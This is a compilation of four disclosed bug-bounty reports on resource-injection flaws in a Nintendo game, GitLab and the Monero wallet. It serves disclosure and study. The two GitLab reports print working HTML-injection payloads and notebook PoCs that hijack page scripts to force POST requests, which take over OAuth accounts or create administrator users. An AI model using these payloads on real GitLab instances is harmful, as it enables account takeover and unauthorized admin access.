# Resource Injection

_4 reports — High/Critical, disclosed_

### [[Xenoblade Chronicles X: Definitive Edition] Unrestricted RPCs allow DoS and writing arbitrary flags remotely](https://hackerone.com/reports/3062122)

- **Report ID:** `3062122`
- **Severity:** Critical
- **Weakness:** Resource Injection
- **Program:** Nintendo
- **Reporter:** @roccodev
- **Bounty:** - usd
- **Disclosed:** 2025-05-15T00:11:16.633Z
- **CVE(s):** -

**Summary (team):**

-

**Summary (researcher):**

Components affected:
* Game software (Xenoblade Chronicles X: Definitive Edition) on Nintendo Switch

**The vulnerability was fixed in the 1.0.2 version of the game, released globally on Apr 23, 2025.**

---
&nbsp;

# Description

As part of its peer-to-peer protocol, the game allows peers in a mission to send RPC (remote procedure call) commands to each other. There were a couple issues with the implementation:

* Many RPCs would accept inputs that would later be used to index arrays, but in many cases those bounds were not checked, allowing an attacker to write arbitrary memory remotely.
* An unrestricted, and mostly unused, RPC would allow writing arbitrary flags to another player's save file (essentially editing their save file). This RPC would not restrict the range of allowed flags to those that the game exposes to multiplayer features in normal operation.

# Impact

A malicious user with a modified console could:

* Write arbitrary flags in save files of other players in the same peer-to-peer mission (e.g. resetting their story progress), in a way that would not be immediately visible to the victim, potentially leading to the loss of a backup save.
* Cause denial of service to other users in the same peer-to-peer mission.

The attacker and the victim(s) would have to be in the same peer-to-peer online mission, connecting online or to the same group is not sufficient.

---

### [Content injection in Jira issue title enabling sending arbitrary POST request as victim](https://hackerone.com/reports/1533976)

- **Report ID:** `1533976`
- **Severity:** High
- **Weakness:** Resource Injection
- **Program:** GitLab
- **Reporter:** @joaxcar
- **Bounty:** 8690 usd
- **Disclosed:** 2022-09-22T21:32:45.137Z
- **CVE(s):** CVE-2022-1940

**Vulnerability Information:**

## Summary

The issue described here leads to the same outcome as my previous report, https://hackerone.com/reports/1409788 . So look into that one for further details on the JavaScript gadgets. Also see my report https://hackerone.com/reports/1481207 for a detailed rundown of injections in GitLab.

This time it is the `title` field of Jira issue pages that renders without proper HTML encoding. Leading to HTML and CSS injection. By abusing a script gadget and a browser quirk (tested on Chrome and Firefox) the injection can be escalated into a highly dangerous arbitrary POST request. Depending on the payload, this POST request can lead to account takeover(of OAuth/SAML accounts) and also generation of admin accounts giving full access to the whole instance.

For the H1 triager it is OK to skip to the POC as the description will contain a lot of GitLab specifics.

## Background
There is a premium feature in GitLab where a user can connect a project with a Jira tracker. See https://docs.gitlab.com/ee/integration/jira/ . When this is set up there will be a path in the project like so: https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues where any tasks created in Jira will be automatically fetched and presented to the members of the project.

Giving a task in Jira a title containing HTML will (if the Jira integration is set up in the project) generate an Jira issue in GitLab with the same title. When viewing the Jira issue details page (https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues/ISO-1) this title field will be displayed without proper HTML encoding and thus render the supplied HTML. The caveat here is that this HTML will be sanitized by DOMPurify as it is added through the Vue `v-safe-html` attribute.

But as I have shown in my previous reports, there exists some JavaScript gadgets that slips through DOMPurify in your current default settings.

If you reed my other reports you can also see that there exists a gadget leading to full XSS, this do require the injected data to be present in the page on initial load. In this case, the data is fetched in a subsequent request and thus miss the first run through main.js

When a detail page for a Jira issue is first visited, the call for the issue data is actually too slow to hit the second tier of JavaScript gadgets (the code inside defered_execution in main.js). But I found a way to bypass this. When a browser leaves a page to visit another page, and then uses History.back (or the back button in the browser) the browser will not generate a complete rerun of the previous requests. It will instead use cached data, even for the data that is not supposed to be cached. So I found out that visiting a infected Jira issue page, browsing away from the page, and then clicking the back button to get to the Jira issue again, will speed up the data call to have it hit by the deferred part of main.js

To weaponize this, all we need is to first navigate away from the page to a server that just runs `History.back()` to directly redirect the user back to the malicious issue page and the payload will now trigger. All this can be made almost guarantied as the injection also allows for arbitrary CSS to be loaded. This makes it possible to craft a page that have an overlay link that will trigger on clicking anywhere.

## The payload
I will present two payloads that will show the potential damage from this attack.

There exists a limitation as for the injection, as Jiras tasks have a 255 letter limit. This is not much to work with, but with some trix we can still get both account takeover and admin creation to work inside this payload.

First of we have a payload that will be able to perform account takeovers on accounts that do not have a password set. This is all OAuth registered accounts (and as far as I understand also SAML and maybe LDAP accounts). These accounts have an auto generated (strong! As of 14.9.2) password after the user signs up with, for example "sign in with GitHub". If the user does not actively go to `/profile/password/edit` and add a new password, the account is vulnerable to this attack. The password update page does not require "current password" before an initial password has been set. The payload looks like this
```
<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
```
If we pull this apart, we have
```
<a 
  href=http:j15.se <--- a site that when visited just throws the user back, saving some chars by omiting slashes
  class=js-feature-highlight <--- the classname to be used as a gadget
  data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'
  ^--- The payload where the POST request will get sent
  >
.</a> <--- close the anchor tag
<style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
  ^--- Unlimited styling to make the website a bulletproof click machine :)
```
This will generate a link covering the whole screen. When clicked (by clicking anywhere) the browser will go to http://j15.se which is a site that directly throws the user back to where it came from. This time, the browser will fetch the data from its cache and thus make the main.js hit the payload. The user will now have to click the page again to actually send the payload. It is two required clicks, but as we have full CSS control we can make it almost guarantied that a user will try to click somewhere on our page.

When the payload have fired, the OAuth user will have a new password. The user will be logged out but nothing else will point to the password having been set. Account takeover complete!


This payload will add a new administrator to the instance if an administrator visits the malicious page
```
<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/api/v4/users?admin=true&email=j@j15.se&name=h&username=hack&password=12345678&skip_confirmation=true'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
```
Pulled apart
```
<a href=http:j15.se
  class=js-feature-highlight
  data-dismiss-endpoint='/api/v4/users?admin=true&email=j@j15.se&name=h&username=hack&password=12345678&skip_confirmation=true'>
.</a>
<style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
```


## Steps to reproduce

This requires three things:
1. access to a premium subscription (no problem on GitLab.com as there are free trials, they work great for the attack)
2. a Jira server. I used a cloud Jira instance on atlassian.com
3. a third party account that is not registered on GitLab. ex a GitHub user

POC:
1. Create a user `attacker`
2. Log in as `attacker` and create a group `attack_group` by visiting https://gitlab.com/groups/new (make sure the group have premium access)
3. Create a new project in the group called `attack_proj`
4. Go to https://gitlab.com/attack_group/attack_proj/-/integrations/jira/edit
5. Follow the guide at https://docs.gitlab.com/ee/integration/jira/issues.html#view-jira-issues to enable viewing Jira issues in the project
6. Log in to Jira and create a task on the dashboard and name it `<img src=#>`
7. Go to https://gitlab.com/attack_group/attack_proj/-/integrations/jira/issues and make sure the task is shown as an issue
8. Click the issue to open the Issue details page. The title will render as a broken image. This proves the injection.

{F1683460}

9. Now go back to Jira and create a new task and name it
```
<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
```
10. Go back to the issue list and refresh to make sure it is created
11. Now log in to GitLab.com with a third party provider, generating a new account on GitLab.com
12. (if the test project is not public invite the new user to the project as a Developer by visiting https://gitlab.com/atack_group/attack_proj/-/project_members)
13. Now visit the https://gitlab.com/attack_group/attack_proj/-/integrations/jira/issues list with the OAuth user and click the task with the payload
14. A page will show up looking empty, click anywhere on the page
15. The page will flicker, and now when you hover over the page it will show a big blue button stating "Got it!". Click it

{F1683461}

16. Refresh the page, you should now be logged out from GitLab.com
17. Log in with the OAuth email and the password `12345678`

Account takeover!

Important to note here is that the second click on the blue button can be made invisible as the first click. I did not want to spend my whole day in CSS but can get back with it if needed! :)

## Impact

HTML and CSS injection in Jira issue page can make POST request as victim user. Can lead to account takeover or admin user escalation.

## What is the current *bug* behavior?

The name/title field in the Jira issue page is not sanitized

## What is the expected *correct* behavior?

The name should be shown sanitized

## Output of checks

This bug happens on GitLab.com

## Impact

Account takeover and admin user creation through arbitrary POST request in Jira issue

---

### [Arbitrary POST request as victim user from HTML injection in Jupyter notebooks](https://hackerone.com/reports/1409788)

- **Report ID:** `1409788`
- **Severity:** High
- **Weakness:** Resource Injection
- **Program:** GitLab
- **Reporter:** @joaxcar
- **Bounty:** 8690 usd
- **Disclosed:** 2022-05-20T14:32:25.611Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary
An attacker can create a Jupyter notebook that will make arbitrary POST requests as the victim user. In the "worst case" an attacker could make an admin create a new admin account for the attacker. Other possible attack vectors are forcing invites to private projects etc. Every POST request is possible.

This research is loosely based on the issue with Rails Ujs data-* parameters. Nowadays DOMPurify strips Rails Ujs data- attributes such as data-url and data-method. What is not stripped is arbitrary data attributes. Looking through the code in https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/main.js , which is run on page load in the UI, I found multiple vectors still possible to abuse.

The script hooks up a lot of event listeners and modifications to the DOM. What is of particular interest for us is the part that is delayed to let additional data on the page load.

```
function deferredInitialisation() {
  const $body = $('body');

  initTopNav();
  initBreadcrumbs();
  initTodoToggle();
  initLogoAnimation();
  initServicePingConsent();
  initUserPopovers();
  initBroadcastNotifications();
  initPersistentUserCallouts();
  initDefaultTrackers();
  initFeatureHighlight();
```

Reading through the source files for these functions I managed to find multiple selector/data-attribute combinations that can be used even with purified HTML.

As an example we have persistent_user_callout in

https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/persistent_user_callout.js

where a POST request is made like

```
dismiss(event, deferredLinkOptions = null) {
    event.preventDefault();

    axios
      .post(this.dismissEndpoint, {
        feature_name: this.featureId,
      })
```

the `dissmissEndpoint` is controllable through a data attribute `data-dissmiss-endpoint`. The data attributes are extracted like so

```
export default class PersistentUserCallout {
  constructor(container, options = container.dataset) {
    const { dismissEndpoint, featureId, deferLinks } = options;
    this.container = container;
    this.dismissEndpoint = dismissEndpoint;
    this.featureId = featureId;
    this.deferLinks = parseBoolean(deferLinks);

    this.init();
  }
```

To be able to fire the dismiss function (and thus the POST request) we also need a `js-close` button

```
const closeButton = this.container.querySelector('.js-close');
```

The HTML needed to set this up is

```
<div class=\"js-new-user-signups-cap-reached\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\" data-defer-links=\"false\" data-feature-id=\"1\">
    <button style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" class=\"js-close\">
        hack
    </button>
</div>
```

The styling is there to make the button as an invisible overlay over the whole page making it trigger on a click anywhere.

Now to the attack. If an attacker creates a Jupyter Notebook there exists the possibility to add HTML in the output fields. This HTML will be sanitized by DOMPurify, but this will not stop the attack.

A file like this will do as a simple POC

```
{
  "cells": [
    {
      "metadata": { "trusted": true },
      "cell_type": "code",
      "source": "<h1>asd</h1>",
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": "<IPython.core.display.HTML object>",
            "text/html": "<div class=\"js-feature-highlight\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/todos/147611488/mark_as_done\" data-auto-devops-help-path=\"hej\" data-highlight-id=\"1\">asdf</div>\n<div class=\"js-new-user-signups-cap-reached\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\" data-defer-links=\"false\" data-feature-id=\"1\"><button style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" class=\"js-close\">hack</button></div>\n"
          },
          "metadata": {}
        }
      ]
    }
  ],
  "metadata": {
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3",
      "language": "python"
    },
    "language_info": {
      "name": "python",
      "version": "3.7.8",
      "mimetype": "text/x-python",
      "codemirror_mode": { "name": "ipython", "version": 3 },
      "pygments_lexer": "ipython3",
      "nbconvert_exporter": "python",
      "file_extension": ".py"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 4
}
```

I have added a `feature-highlight` (another possible vector, see image) just to show when the attack is successful. As the main.js script is run with a timer, sometimes one has to refresh the page to have the payload "load up" (this could possibly be worked around). When the attack is loaded, the highlight div will turn into a blue dot.

{F1525031}

Visiting this site and clicking anywhere will add a Todo on an Issue on one of my projects. I have also tested this attack with an attack creating an admin account. Replacing the payload in the POC with this one

```
"text/html": "<div class=\"js-new-user-signups-cap-reached\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/users?admin=true&email=joaxcarte01@wearehackerone.com&name=just&username=just&password=asdasdasdasd\" data-defer-links=\"false\" data-feature-id=\"1\"><button style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" class=\"js-close\">.</button></div>\n"}
```

A visit by an admin to this site would end up with a new admin account being created.

Finally I want to point out that this kind of attack is possible anywhere where HTML injection could happen. Even with Purified HTML.

### Steps to reproduce
1. Create a project on GitLab.com
2. Create a new file named `hack.ipynb` (or upload the included file) with the content
{F1525030}
```
{
  "cells": [
    {
      "metadata": { "trusted": true },
      "cell_type": "code",
      "source": "<h1>asd</h1>",
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": "<IPython.core.display.HTML object>",
            "text/html": "<div class=\"js-feature-highlight\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/todos/147611488/mark_as_done\" data-auto-devops-help-path=\"hej\" data-highlight-id=\"1\">asdf</div>\n<div class=\"js-new-user-signups-cap-reached\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\" data-defer-links=\"false\" data-feature-id=\"1\"><button style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" class=\"js-close\">hack</button></div>\n"
          },
          "metadata": {}
        }
      ]
    }
  ],
  "metadata": {
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3",
      "language": "python"
    },
    "language_info": {
      "name": "python",
      "version": "3.7.8",
      "mimetype": "text/x-python",
      "codemirror_mode": { "name": "ipython", "version": 3 },
      "pygments_lexer": "ipython3",
      "nbconvert_exporter": "python",
      "file_extension": ".py"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 4
}
```
3. Click save
4. After saving you will land on the preview page for the file. If the out block does not contain a blue dot, refresh this page.
5. When the dot is blue click anywhere on the page
6. Now go to https://gitlab.com/dashboard/todos and check that a todo have been added

video example of the POC (note the todo being empty and the blue dot):

█████

### Impact

An attacker can make arbitrary POST requests as a victim user visiting a Jupyter notebook. Worst case giving the attacker admin access to the instance.

### Examples

Private project:
https://gitlab.com/parent02/sub2/asd/-/blob/main/hack.ipynb

### What is the current *bug* behavior?

DOMPurify does not filter out arbitrary data-* attributes, making it possible to high jack Gitlab UI JavaScript to make POST requests

### What is the expected *correct* behavior?

The attributes should not work in Jupyter notebooks

### Output of checks

This bug happens on GitLab.com

## Impact

An attacker can make arbitrary POST requests as a victim user visiting a Jupyter notebook. Worst case giving the attacker admin access to the instance.

---

### [Zero-amount miner TX + RingCT allows monero wallet to receive arbitrary amount of monero](https://hackerone.com/reports/501585)

- **Report ID:** `501585`
- **Severity:** Critical
- **Weakness:** Resource Injection
- **Program:** Monero
- **Reporter:** @cutcoin
- **Bounty:** - usd
- **Disclosed:** 2019-07-03T00:12:36.057Z
- **CVE(s):** -

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!

**Summary:** 

By mining a specially crafted block, that still passes daemon verification an attacker can create a miner transaction that appears to the wallet to include sum of XMR picked by the attacker. It is our belief that this can be exploited to steal money from exchanges.

**Description:** 

I'm the lead developer of CUT coin (https://github.com/cutcoin/cutcoin), a coin based on Monero codebase. Our aim is to build a cryptonote coin with proof of stake consensus.  In order to achieve this we needed to deeply analize both block verification in daemon and get familiar with wallet code. This lead us to discovering a vulnerability in (mainly) the wallet, that allows an attacker to convince any cli wallet that it received transaction with amount chosen by the attacker, that is virtually any. It is our believe that this can be used to send such counterfeit XMR to an exchange, that will credit the attacker with the sait amount of XMR inside the exchange, which can be exchanged for other coins and withdrawn. However this was of course not attempted. It is our belief that the vulnerability can not be used to "mint" real, transactable monero out of thin air, at least without knowledge of private key of rct::H.

The vulnerability is not very hard to describe. According to current verification rules in the daemon, it is perfectly fine to have a zero amount in the miner transaction (besides the real, non-zero amount). It is also perfectly fine to have RCT signatures and they of course will not be checked. On the other hand, there is code in the wallet that basically says "if the amount is zero, decode the amount from RCT".

So to exploit the vulnerability an attacker will need to modify the daemon to create blocktemplates with zero amount in the miner tx, with a valid-enough RCT signatures so the amount will decode. The attacker will need to mine a block directly to an exchange wallet. Most exchanges identify their users by payment id. Including the said field in miner tx is not available functionality. While this seems to be trivial to implement, it was not attempted by us.

Obviously this issue can be resolved in both the daemon and the wallet.

We have verified that the vulnerability is exploitable against github master as of today, February 25th.

We have proof of concept code, that can be provided if needed.

We leave decision about disclosure and timeline of this issue entirely to you. We do not intend to disclose it at all, however we will appreciate credit when disclosed.

A fix for this vulnerability was today published to our github as a part of a single huge commit and is unlikely to be noticed by anyone.


## Releases Affected:

  * current git master

## Impact

Tricking an exchange that she has deposited a huge sum of XMR and therefore effectively stealing from the said exchange.

---
